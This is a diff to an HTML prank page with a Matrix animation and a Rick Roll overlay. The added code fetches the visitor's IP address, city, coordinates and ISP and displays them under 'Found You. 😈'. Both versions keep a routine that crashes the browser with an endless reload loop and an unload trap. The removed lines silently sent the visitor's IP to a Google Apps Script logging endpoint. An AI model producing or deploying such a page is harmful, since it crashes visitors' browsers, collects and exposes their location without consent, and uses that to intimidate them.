@@ -7,12 +7,7 @@
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
 
-    /* Basic Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
       background: black;
@@ -22,7 +17,6 @@
       position: relative;
     }
 
-    /* Matrix Background Canvas */
     #matrixCanvas {
       position: fixed;
       top: 0;
@@ -32,7 +26,6 @@
       z-index: -1;
     }
 
-    /* Main Content Container */
     #content {
       position: relative;
       z-index: 1;
@@ -52,8 +45,7 @@
       margin-bottom: 20px;
     }
 
-    input,
-    button {
+    input, button {
       font-size: 1.2rem;
       padding: 10px;
       background: black;
@@ -68,24 +60,25 @@
       cursor: pointer;
     }
 
-    /* Message and Hacker Image */
-    #message {
-      margin-top: 20px;
-      opacity: 0;
-      transition: opacity 1s;
+    #locationInfo {
+      display: none;
+      text-align: left;
+      margin: 30px auto;
+      width: 60%;
+      border: 2px solid #00ff00;
+      padding: 15px;
+      font-size: 1.2rem;
+      background: rgba(0, 0, 0, 0.8);
+      box-shadow: 0 0 10px #00ff00;
     }
 
-    #message.visible {
-      opacity: 1;
+    #locationInfo p {
+      color: #0F0;
+      margin: 5px 0;
     }
 
-    .hacker {
-      width: 300px;
-      display: block;
-      margin: 20px auto;
-    }
+    .highlight { color: #ff0000; }
 
-    /* Chaos Overlay */
     #chaosOverlay {
       position: fixed;
       top: 0;
@@ -101,10 +94,7 @@
       padding-top: 40vh;
     }
 
-    /* Flashing Background for Chaos */
-    .flashing {
-      animation: flash 0.1s infinite;
-    }
+    .flashing { animation: flash 0.1s infinite; }
 
     @keyframes flash {
       0% { background-color: black; }
@@ -114,7 +104,6 @@
       100% { background-color: black; }
     }
 
-    /* Embedded Video Styles */
     #rickRollVideo {
       position: absolute;
       top: 0;
@@ -127,39 +116,74 @@
   </style>
 </head>
 <body>
-  <!-- Matrix Background -->
   <canvas id="matrixCanvas"></canvas>
 
-  <!-- Main Content -->
   <div id="content">
     <h1>Welcome to the System</h1>
     <p>What is your name, good boy? 🟩</p>
     <input type="text" id="nameInput" placeholder="Enter your name..." />
-    <button onclick="startCrash()">Submit</button>
+    <button onclick="startProcess()">Submit</button>
 
-    <div id="message">
-      <h1>Good boy, <span id="userName"></span> 😈</h1>
-      <p>Kiss your Chromebook goodbye... 💋</p>
-      <!-- Hacker Image -->
-      <img
-        src="https://lh4.googleusercontent.com/proxy/HQp3JQwu8uKU5seHJRUTG3u6_aNKTZcJV2cQhPXmHGB3gSRFXyiC8arcyjH-zAqmkPO896YkaNPEmpiLoG__EGmtbg4Vjqr1g8mDdweSgzHP5V_gpgqhHtRyCK6SGCq1uYF6Z0IxY8i2iaIm3yKVHWA"
-        alt="Hacker"
-        class="hacker"
-        id="hackerImg"
-      />
-      <!-- Evil Laughter Sound -->
-      <audio id="evilLaugh" src="YOUR_MP3_FILE_URL_HERE.mp3" preload="auto"></audio>
+    <div id="locationInfo">
+      <h2>Found You. 😈</h2>
+      <p><strong>IP Address:</strong> <span id="ip_address"></span></p>
+      <p><strong>Country:</strong> <span id="country_name"></span></p>
+      <p><strong>Region:</strong> <span id="region_name"></span></p>
+      <p><strong>City:</strong> <span id="city_name"></span></p>
+      <p><strong>Latitude:</strong> <span id="latitude"></span></p>
+      <p><strong>Longitude:</strong> <span id="longitude"></span></p>
+      <p><strong>Postal Code:</strong> <span id="postal_code"></span></p>
+      <p><strong>Timezone:</strong> <span id="timezone"></span></p>
+      <p><strong>ISP:</strong> <span id="isp"></span></p>
     </div>
   </div>
 
-  <!-- Chaos Overlay (initially hidden) -->
   <div id="chaosOverlay">SYSTEM FAILURE</div>
-
-  <!-- Rick Roll Video (initially hidden) -->
   <iframe id="rickRollVideo" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&modestbranding=1&showinfo=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
-    // MATRIX EFFECT SETUP
+    function startProcess() {
+      const name = document.getElementById('nameInput').value.trim() || 'User';
+      document.querySelector('h1').textContent = `Hello, ${name} 😈`;
+      document.querySelector('p').textContent = "We know where you are... Fetching data...";
+      document.getElementById('nameInput').style.display = 'none';
+      document.querySelector('button').style.display = 'none';
+
+      setTimeout(() => {
+        $.getJSON("https://ipapi.co/json/", function(data) {
+          $("#ip_address").text(data.ip);
+          $("#country_name").text(data.country_name);
+          $("#region_name").text(data.region);
+          $("#city_name").text(data.city);
+          $("#latitude").text(data.latitude);
+          $("#longitude").text(data.longitude);
+          $("#postal_code").text(data.postal);
+          $("#timezone").text(data.timezone);
+          $("#isp").text(data.org);
+          document.getElementById('locationInfo').style.display = 'block';
+        });
+      }, 2000);
+
+      setTimeout(startChaos, 7000);
+    }
+
+    function startChaos() {
+      document.getElementById('chaosOverlay').style.display = 'block';
+      document.getElementById('chaosOverlay').classList.add('flashing');
+
+      setInterval(() => {
+        const x = Math.random() * 10 - 5;
+        const y = Math.random() * 10 - 5;
+        document.body.style.transform = `translate(${x}px, ${y}px)`;
+      }, 50);
+
+      document.getElementById('rickRollVideo').style.display = 'block';
+
+      onbeforeunload = function() { localStorage.x = 1; };
+      setTimeout(() => { while (1) location.reload(1); }, 1000);
+    }
+
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth;
@@ -169,98 +193,20 @@
     const matrix = letters.split("");
     const fontSize = 16;
     const columns = canvas.width / fontSize;
-    const drops = [];
-    for (let i = 0; i < columns; i++) {
-      drops[i] = 1;
-    }
+    const drops = Array(columns).fill(1);
 
     function drawMatrix() {
       ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
       ctx.fillRect(0, 0, canvas.width, canvas.height);
       ctx.fillStyle = "#0F0";
       ctx.font = fontSize + "px monospace";
-      for (let i = 0; i < drops.length; i++) {
+      drops.forEach((drop, i) => {
         const text = matrix[Math.floor(Math.random() * matrix.length)];
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-          drops[i] = 0;
-        }
-        drops[i]++;
-      }
+        ctx.fillText(text, i * fontSize, drop * fontSize);
+        drops[i] = drop * fontSize > canvas.height && Math.random() > 0.975 ? 0 : drop + 1;
+      });
     }
     setInterval(drawMatrix, 50);
-
-    // Start fullscreen automatically when the page loads
-    window.onload = function() {
-      if (document.documentElement.requestFullscreen) {
-        document.documentElement.requestFullscreen();
-      } else if (document.documentElement.mozRequestFullScreen) { // Firefox
-        document.documentElement.mozRequestFullScreen();
-      } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
-        document.documentElement.webkitRequestFullscreen();
-      } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
-        document.documentElement.msRequestFullscreen();
-      }
-
-      // Get the user's IP address using ipify
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip; // Get the IP address from the response
-
-          // Send the IP address to your Google Apps Script to log it in Sheets
-          fetch('https://script.google.com/macros/s/AKfycbyAJf9a4Wiw6quWqErjB5WN11Yt9AGyb598Jd16rJSM5LeWFepIvnCsUKbewboekz6NZA/exec', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            mode: 'cors', // Fixes CORS error
-            body: JSON.stringify({ ip: ip }) // Send the IP as part of the body
-          })
-          .then(response => response.json())
-          .then(data => console.log("IP Logged:", data))
-          .catch(error => console.error("Error sending IP to Google Apps Script:", error));
-        })
-        .catch(error => console.error("Error fetching IP address:", error));
-    };
-
-    // START CRASH FUNCTION
-    function startCrash() {
-      // Get the user's name
-      const name = document.getElementById('nameInput').value.trim() || 'User';
-      document.getElementById('userName').textContent = name;
-
-      // Reveal the message div
-      document.getElementById('message').classList.add('visible');
-
-      // Hide the input and button
-      document.getElementById('nameInput').style.display = 'none';
-      document.querySelector('button').style.display = 'none';
-
-      // Play the evil laugh sound
-      document.getElementById('evilLaugh').play();
-
-      // After 3 seconds, show the chaos overlay and begin chaos mode
-      setTimeout(() => {
-        const chaos = document.getElementById('chaosOverlay');
-        chaos.style.display = 'block';
-        chaos.classList.add('flashing');
-
-        // Begin screen shaking
-        setInterval(() => {
-          const x = Math.random() * 10 - 5;
-          const y = Math.random() * 10 - 5;
-          document.body.style.transform = `translate(${x}px, ${y}px)`;
-        }, 50);
-
-        // Show the Rick Roll video
-        document.getElementById('rickRollVideo').style.display = 'block';
-
-        // ORIGINAL CRASH CODE:
-        onbeforeunload = function(){ localStorage.x = 1; };
-        setTimeout(function(){
-          while(1) location.reload(1);
-        }, 1000);
-      }, 3000);
-    }
   </script>
 </body>
 </html>
